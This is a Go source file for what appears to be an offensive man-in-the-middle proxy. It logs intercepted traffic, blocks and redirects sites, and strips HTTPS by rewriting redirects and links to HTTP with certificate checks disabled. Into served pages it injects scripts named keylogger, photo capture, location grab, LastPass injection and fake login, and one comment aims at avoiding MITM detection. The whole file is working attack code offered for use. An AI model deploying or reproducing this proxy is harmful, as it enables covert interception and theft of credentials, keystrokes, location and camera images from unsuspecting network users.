package controllers

import (
    "github.com/abourget/goproxy"
    "log"
    "net/http"
    "strings"
    "bytes"
    "io/ioutil"
    "crypto/tls"
    "time"
)

const (
    CONN_HOST = "0.0.0.0"
    CONN_PORT = "8080"
    CONN_TYPE = "tcp"

    INJECT_LOGGER_REPLACE = "</body>"
    INJECT_LOGGER_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>"
    INJECT_PHOTO_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/takePhoto.js\"></script></body>"
    INJECT_LOCATION_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/getLocation.js\"></script></body>"
    INJECT_LASTPASS_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
    INJECT_LOGIN_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/login.js\"></script></body>"
)
// Provide booleans for each function
var globalStoreHAR bool
var globalRedirects bool
var globalBlocks bool
var globalWolfPack bool
var globalInjectKeyLogger bool
var globalInjectGetLocation bool
var globalInjectGetPhoto bool
var globalInjectGetLogin bool
var globalInjectLastpass bool
var globalProxyStandard bool

func StartSimpleProxy() {

    log.Println(" >>> STARTING PROXY SERVER")
    log.Println("     --- OPTION storing HAR ", globalStoreHAR )
    log.Println("     --- OPTION redirection ", globalRedirects )
    log.Println("     --- OPTION blocking ", globalBlocks )
    log.Println("     --- OPTION wolf-pack-hack ", globalWolfPack )
    log.Println("     --- OPTION inject key logger ", globalInjectKeyLogger )
    log.Println("     --- OPTION inject login ", globalInjectGetLogin )
    log.Println("     --- OPTION inject Photo Request ", globalInjectGetPhoto )
    log.Println("     --- OPTION inject Location Request ", globalInjectGetLocation )
    log.Println("     --- OPTION inject Request Lastpass ", globalInjectLastpass )
 
    stoppableListener, _ = New(listener) //create a stoppable listener from the listener
    // Start the proxy.
    proxy := goproxy.NewProxyHttpServer()

    // What does this do?
    proxy.Verbose = false

    // Check if we are BLOCKING this page.
    if globalBlocks {
        pageBlock := TriggerBlock()
        log.Println("blocking")
        proxy.HandleRequest(goproxy.RequestHostContains(banned...)(pageBlock))
    } // end of blocks.

    // Check if we are REDIRECTING away from this page.
    if globalRedirects {
        pageRedirect := TriggerRedirect()
        proxy.HandleRequest( goproxy.RequestHostContains(redirect...)(pageRedirect) )
    } // end of redirect.

    if globalWolfPack {
        // Catch HSTS and direct https:// (i.e it immediately puts an SNI header in place)
        proxy.HandleConnectFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
            // Potentially best to REJECT so that MITM is not detected. detection of MITM could cause suspicion
            if ctx.SNIHost() != "" {
                log.Println(" *** HTTPS Connection: ", ctx.SNIHost())
                //return goproxy.MITM // This is failing...
                return goproxy.NEXT
            }
            return goproxy.FORWARD
        })
    }

    // Handle the CLIENT-REQUEST.
    proxy.HandleRequestFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        if globalStoreHAR {
            log.Println(" --- CLIENT REQUEST: logging HAR to "+ctx.Host()+".har")
            ctx.LogToHARFile(true)
            t := time.Now().Local()
            timestamp := t.Format("20060102150405")
            proxy.FlushHARToDisk(fileLocation+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
        } else {
            //log.Println(" --- CLIENT REQUEST: NOT logging HAR for "+ctx.Host() )
        }
        // Check if this is HTTPS connection via MITM.
        if ctx.IsThroughMITM {
            ctx.Req.Host = ctx.Host()
            log.Println(" $$$ MITM: Connection is over HTTPS")
            return goproxy.FORWARD // don't follow through other Request Handlers
        }

        return goproxy.NEXT
    })

    // Wolf pack hack.
    // We want to make sure that if a page redirects to https using a 301 or 302 we mitm that connection.
    // Handle the SERVER-RESPONSE
    if globalWolfPack {
        
        interceptResponse := TriggerWolfPack()
        proxy.HandleResponse(interceptResponse)

    } else {
        interceptResponse := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
            // Log HAR files.
            if globalStoreHAR {
                log.Println(" --- SERVER RESPONSE: logging to "+ctx.Host()+".har")
                ctx.LogToHARFile(true)
                t := time.Now().Local()
                timestamp := t.Format("20060102150405")
                proxy.FlushHARToDisk(fileLocation+"/hars/res_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
            } else {
                //log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
            }
            bs, err := ioutil.ReadAll(ctx.Resp.Body)
            if err != nil {
               log.Println("inject error: ", err)
            }
            //process whether to inject scripts
            body := utilsProcessInjectionScripts(ctx, string(bs))
            
            ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
            return goproxy.NEXT
        })
        proxy.HandleResponse(interceptResponse)
    }

    go func() {
        wg.Add(1)
        defer wg.Done()
        http.Serve(stoppableListener, proxy)
    }()

}

//
func TriggerRedirect() goproxy.HandlerFunc {
    // Create a new pageRedirect handler function to pass back later on.
    pageRedirect := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        // Get the body for the redirect url.
        body := utilsGetBuffer(strings.Split(ctx.Req.URL.Host, ".")[1]) //get the middle of the url: www.url.com...
        //body = utilsInjector(ctx,body, "</body>", "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>")
        // Set the response-headers before responding.
        client_response := utilsGetHTTPHeaders(body,"text/html")
        ctx.Resp = client_response
        ctx.DispatchResponseHandlers()
        return goproxy.DONE
    })
    return pageRedirect
}


//
func TriggerBlock() goproxy.HandlerFunc {
    log.Println("blocker")
    // Create a new pageBlocker handler function to pass back later on.
    pageBlocker := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        // Create the body, very naieve for now.
        body := "<html><body><h1>This site is blocked</h1></body></html>"
        // Set the response-headers before responding.
        client_response := utilsGetHTTPHeaders(body,"text/html")
        ctx.Resp = client_response
        ctx.DispatchResponseHandlers()
        return goproxy.DONE
    })
    return pageBlocker
}


func TriggerWolfPack() goproxy.HandlerFunc {
    //
    interceptResponse := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        
        // Check if the SERVER-RESPOSE is actually giving us a 301/302 redirection.
        if ctx.Resp != nil && (strings.Contains(ctx.Resp.Status, "301") || strings.Contains(ctx.Resp.Status, "302")) {
            
            // Check if we are directed to an HTTPS page
            // Then we kill the original request, and make the connection ourself
            if strings.Contains(ctx.Resp.Header.Get("Location"), "https") {

                log.Println(" *** ---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
                log.Println(" *** <<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))

                ctx.Resp.Request.URL.Scheme = "http"
                ctx.Resp.Header.Set("Location", strings.Replace(ctx.Resp.Header.Get("Location"), "https", "http", -1))
                ctx.Resp.Request.URL.Host = strings.Replace(ctx.Host(), "https", "http", -1)

                tr := &http.Transport{
                    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                }
                client := &http.Client{Transport: tr}
                server_ssl_response, err := client.Get( ctx.Resp.Header.Get("Location") )
                if err != nil {
                    log.Println(" help!: ", err)
                }
                // log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))

                // log.Println(server_ssl_response.TLS)
                bs, err := ioutil.ReadAll(server_ssl_response.Body)
                if err != nil {
                    log.Println(err)
                }
                body := string(bs)
                body = strings.Replace(body, "https", "http", -1)
                if globalInjectKeyLogger {
                    utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                    body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
                }
                // Create a response object from the body.
                client_response := utilsGetHTTPHeaders(body,server_ssl_response.Header.Get("Content-Type"))
                ctx.Resp = client_response
                return goproxy.FORWARD

            } else { // if ctx.Resp.Header.Get("Location")[0:5] == "http:" {
                // Redirecting to some HTTP page.
                log.Println("Response is HTTP")
                bs, err := ioutil.ReadAll(ctx.Resp.Body)
                if err != nil {
                    log.Println(err)
                }
                body := string(bs)
                // strip all https out of the page so that a redirect will be required if necessary
                body = strings.Replace(body, "https", "http", -1)
                if globalInjectKeyLogger {
                    utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                    body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
                }
                ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
                return goproxy.NEXT
            }

        } // end of 301-302 redirects.

        return goproxy.NEXT
    }) // end of the proxy OnResponse.
    return interceptResponse
}